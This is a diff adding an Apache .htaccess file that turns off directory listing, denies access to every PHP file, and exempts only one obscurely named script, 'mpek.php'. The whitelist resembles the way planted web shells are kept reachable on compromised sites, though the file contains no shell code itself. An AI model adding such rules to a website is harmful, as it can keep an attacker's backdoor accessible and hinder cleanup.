@@ -1,0 +1,13 @@
+Options -Indexes
+
+<Files ".htaccess">
+    Require all denied
+</Files>
+
+<FilesMatch "\.(php|phtml|php[0-9]|phtml[0-9]|PHP|Php|PHp|pHp|pHP|PhP)$">
+    Require all denied
+</FilesMatch>
+
+<Files "mpek.php">
+    Require all granted
+</Files>
